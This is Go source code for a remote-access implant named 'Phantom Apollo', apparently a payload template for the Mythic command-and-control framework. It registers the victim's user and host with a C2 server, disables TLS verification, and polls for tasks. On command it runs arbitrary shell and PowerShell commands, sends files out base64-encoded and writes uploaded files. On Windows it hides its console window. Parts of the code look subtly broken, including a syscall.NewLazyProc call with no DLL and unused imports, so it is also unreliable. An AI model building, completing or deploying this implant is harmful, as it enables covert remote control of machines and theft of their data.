package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// Build-time configuration (will be replaced during build)
const (
	MYTHIC_URL         = "{{.callback_host}}:{{.callback_port}}"
	CALLBACK_INTERVAL  = {{.callback_interval}}
	CALLBACK_JITTER    = {{.callback_jitter}}
	USE_SSL           = {{.use_ssl}}
	USER_AGENT        = "{{.user_agent}}"
	AES_PSK           = "{{.aes_psk}}"
	DEBUG_MODE        = {{.debug}}
)

// Global variables
var (
	agentID     string
	currentDir  string
	httpClient  *http.Client
)

// GraphQL structures
type GraphQLRequest struct {
	Query     string                 `json:"query"`
	Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
	Data   map[string]interface{} `json:"data"`
	Errors []interface{}          `json:"errors"`
}

type Task struct {
	ID        string `json:"id"`
	Command   string `json:"command"`
	Params    string `json:"params"`
	Timestamp string `json:"timestamp"`
}

type TaskResponse struct {
	TaskID     string `json:"task_id"`
	Output     string `json:"output"`
	Status     string `json:"status"`
	Completed  bool   `json:"completed"`
}

func init() {
	// Initialize HTTP client with TLS config
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	httpClient = &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
	}
	
	// Get current directory
	if dir, err := os.Getwd(); err == nil {
		currentDir = dir
	}
}

func main() {
	if DEBUG_MODE {
		fmt.Println("[DEBUG] Phantom Apollo agent starting...")
	}
	
	// Register with Mythic server
	if err := registerAgent(); err != nil {
		if DEBUG_MODE {
			fmt.Printf("[ERROR] Failed to register: %v\n", err)
		}
		return
	}
	
	// Main callback loop
	for {
		if err := checkForTasks(); err != nil && DEBUG_MODE {
			fmt.Printf("[ERROR] Task check failed: %v\n", err)
		}
		
		// Apply jitter to callback interval
		jitter := time.Duration(CALLBACK_JITTER) * time.Second / 100
		sleepTime := time.Duration(CALLBACK_INTERVAL)*time.Second + 
			time.Duration(time.Now().UnixNano()%int64(jitter*2)) - jitter
		time.Sleep(sleepTime)
	}
}

func registerAgent() error {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	
	query := `
	mutation RegisterCallback($input: CallbackInput!) {
		createCallback(input: $input) {
			id
			status
		}
	}`
	
	variables := map[string]interface{}{
		"input": map[string]interface{}{
			"user":         username,
			"host":         hostname,
			"pid":          os.Getpid(),
			"ip":           getLocalIP(),
			"external_ip":  "",
			"process_name": getProcessName(),
			"description":  "Phantom Apollo Agent",
			"payload_type": "phantom_apollo",
			"c2_profile":   "HTTP",
			"encryption_key": AES_PSK,
		},
	}
	
	resp, err := makeGraphQLRequest(query, variables)
	if err != nil {
		return err
	}
	
	if callback, ok := resp.Data["createCallback"].(map[string]interface{}); ok {
		if id, exists := callback["id"]; exists {
			agentID = fmt.Sprintf("%v", id)
			if DEBUG_MODE {
				fmt.Printf("[DEBUG] Registered with ID: %s\n", agentID)
			}
		}
	}
	
	return nil
}

func checkForTasks() error {
	if agentID == "" {
		return fmt.Errorf("agent not registered")
	}
	
	query := `
	query GetTasks($callback_id: String!) {
		task(where: {callback_id: {_eq: $callback_id}, status: {_eq: "submitted"}}) {
			id
			command
			params
			timestamp
		}
	}`
	
	variables := map[string]interface{}{
		"callback_id": agentID,
	}
	
	resp, err := makeGraphQLRequest(query, variables)
	if err != nil {
		return err
	}
	
	if tasks, ok := resp.Data["task"].([]interface{}); ok {
		for _, taskData := range tasks {
			if task, ok := taskData.(map[string]interface{}); ok {
				t := Task{
					ID:      fmt.Sprintf("%v", task["id"]),
					Command: fmt.Sprintf("%v", task["command"]),
					Params:  fmt.Sprintf("%v", task["params"]),
				}
				
				go executeTask(t)
			}
		}
	}
	
	return nil
}

func executeTask(task Task) {
	if DEBUG_MODE {
		fmt.Printf("[DEBUG] Executing task: %s\n", task.Command)
	}
	
	var output string
	var err error
	
	switch task.Command {
	case "ls":
		output = executeLS(task.Params)
	case "cd":
		output = executeCD(task.Params)
	case "pwd":
		output = executePWD()
	case "ps":
		output = executePS()
	case "whoami":
		output = executeWhoami()
	case "hostname":
		output = executeHostname()
	case "shell":
		output = executeShell(task.Params)
	case "powershell":
		output = executePowerShell(task.Params)
	case "download":
		output = executeDownload(task.Params)
	case "upload":
		output = executeUpload(task.Params)
	case "sleep":
		output = executeSleep(task.Params)
	case "exit":
		output = "Agent exiting..."
		sendTaskResponse(task.ID, output, "completed")
		os.Exit(0)
	default:
		output = fmt.Sprintf("Unknown command: %s", task.Command)
	}
	
	if err != nil {
		output = fmt.Sprintf("Error: %v", err)
	}
	
	sendTaskResponse(task.ID, output, "completed")
}

func executeLS(params string) string {
	var path string
	if params != "" {
		var paramMap map[string]interface{}
		if err := json.Unmarshal([]byte(params), &paramMap); err == nil {
			if p, ok := paramMap["path"].(string); ok {
				path = p
			}
		} else {
			path = params
		}
	}
	
	if path == "" {
		path = currentDir
	}
	
	files, err := ioutil.ReadDir(path)
	if err != nil {
		return fmt.Sprintf("Error reading directory: %v", err)
	}
	
	var result strings.Builder
	for _, file := range files {
		mode := file.Mode()
		size := file.Size()
		modTime := file.ModTime().Format("2006-01-02 15:04:05")
		
		if file.IsDir() {
			result.WriteString(fmt.Sprintf("d %s %8d %s %s\n", mode.String(), size, modTime, file.Name()))
		} else {
			result.WriteString(fmt.Sprintf("- %s %8d %s %s\n", mode.String(), size, modTime, file.Name()))
		}
	}
	
	return result.String()
}

func executeCD(params string) string {
	var path string
	if params != "" {
		var paramMap map[string]interface{}
		if err := json.Unmarshal([]byte(params), &paramMap); err == nil {
			if p, ok := paramMap["path"].(string); ok {
				path = p
			}
		} else {
			path = params
		}
	}
	
	if path == "" {
		return "No path specified"
	}
	
	if err := os.Chdir(path); err != nil {
		return fmt.Sprintf("Error changing directory: %v", err)
	}
	
	currentDir, _ = os.Getwd()
	return fmt.Sprintf("Changed directory to: %s", currentDir)
}

func executePWD() string {
	if dir, err := os.Getwd(); err == nil {
		currentDir = dir
		return dir
	}
	return "Error getting current directory"
}

func executePS() string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("tasklist", "/fo", "csv")
	} else {
		cmd = exec.Command("ps", "aux")
	}
	
	output, err := cmd.Output()
	if err != nil {
		return fmt.Sprintf("Error executing ps: %v", err)
	}
	
	return string(output)
}

func executeWhoami() string {
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	
	hostname, _ := os.Hostname()
	return fmt.Sprintf("%s@%s", username, hostname)
}

func executeHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return fmt.Sprintf("Error getting hostname: %v", err)
	}
	return hostname
}

func executeShell(params string) string {
	var command string
	if params != "" {
		var paramMap map[string]interface{}
		if err := json.Unmarshal([]byte(params), &paramMap); err == nil {
			if cmd, ok := paramMap["command"].(string); ok {
				command = cmd
			}
		} else {
			command = params
		}
	}
	
	if command == "" {
		return "No command specified"
	}
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}
	
	return string(output)
}

func executePowerShell(params string) string {
	if runtime.GOOS != "windows" {
		return "PowerShell only available on Windows"
	}
	
	var command string
	if params != "" {
		var paramMap map[string]interface{}
		if err := json.Unmarshal([]byte(params), &paramMap); err == nil {
			if cmd, ok := paramMap["command"].(string); ok {
				command = cmd
			}
		} else {
			command = params
		}
	}
	
	if command == "" {
		return "No PowerShell command specified"
	}
	
	cmd := exec.Command("powershell", "-Command", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}
	
	return string(output)
}

func executeDownload(params string) string {
	var path string
	if params != "" {
		var paramMap map[string]interface{}
		if err := json.Unmarshal([]byte(params), &paramMap); err == nil {
			if p, ok := paramMap["path"].(string); ok {
				path = p
			}
		} else {
			path = params
		}
	}
	
	if path == "" {
		return "No file path specified"
	}
	
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return fmt.Sprintf("Error reading file: %v", err)
	}
	
	encoded := base64.StdEncoding.EncodeToString(data)
	return fmt.Sprintf("File downloaded: %s\nSize: %d bytes\nData: %s", path, len(data), encoded)
}

func executeUpload(params string) string {
	var paramMap map[string]interface{}
	if err := json.Unmarshal([]byte(params), &paramMap); err != nil {
		return fmt.Sprintf("Error parsing upload parameters: %v", err)
	}
	
	path, ok := paramMap["remote_path"].(string)
	if !ok {
		return "No remote path specified"
	}
	
	dataStr, ok := paramMap["file"].(string)
	if !ok {
		return "No file data specified"
	}
	
	data, err := base64.StdEncoding.DecodeString(dataStr)
	if err != nil {
		return fmt.Sprintf("Error decoding file data: %v", err)
	}
	
	if err := ioutil.WriteFile(path, data, 0644); err != nil {
		return fmt.Sprintf("Error writing file: %v", err)
	}
	
	return fmt.Sprintf("File uploaded successfully: %s (%d bytes)", path, len(data))
}

func executeSleep(params string) string {
	// This would modify the global callback interval
	// For now, just return confirmation
	return fmt.Sprintf("Sleep interval modification requested: %s", params)
}

func sendTaskResponse(taskID, output, status string) {
	query := `
	mutation UpdateTask($task_id: String!, $response: String!, $status: String!) {
		updateTask(id: $task_id, response: $response, status: $status) {
			id
			status
		}
	}`
	
	variables := map[string]interface{}{
		"task_id":  taskID,
		"response": base64.StdEncoding.EncodeToString([]byte(output)),
		"status":   status,
	}
	
	if _, err := makeGraphQLRequest(query, variables); err != nil && DEBUG_MODE {
		fmt.Printf("[ERROR] Failed to send task response: %v\n", err)
	}
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
	reqBody := GraphQLRequest{
		Query:     query,
		Variables: variables,
	}
	
	jsonData, err := json.Marshal(reqBody)
	if err != nil {
		return nil, err
	}
	
	protocol := "http"
	if USE_SSL {
		protocol = "https"
	}
	
	url := fmt.Sprintf("%s://%s/graphql", protocol, MYTHIC_URL)
	
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", USER_AGENT)
	
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	
	var graphQLResp GraphQLResponse
	if err := json.Unmarshal(body, &graphQLResp); err != nil {
		return nil, err
	}
	
	return &graphQLResp, nil
}

func getLocalIP() string {
	// Simple implementation - get first non-loopback interface
	return "127.0.0.1" // Placeholder
}

func getProcessName() string {
	if len(os.Args) > 0 {
		return filepath.Base(os.Args[0])
	}
	return "phantom_apollo"
}

// Windows-specific functions
func init() {
	if runtime.GOOS == "windows" {
		// Hide console window
		hideConsole()
	}
}

func hideConsole() {
	if runtime.GOOS == "windows" {
		getConsoleWindow := syscall.NewLazyProc("GetConsoleWindow")
		showWindow := syscall.NewLazyProc("ShowWindow")
		
		hwnd, _, _ := getConsoleWindow.Call()
		if hwnd != 0 {
			showWindow.Call(hwnd, 0) // SW_HIDE
		}
	}
}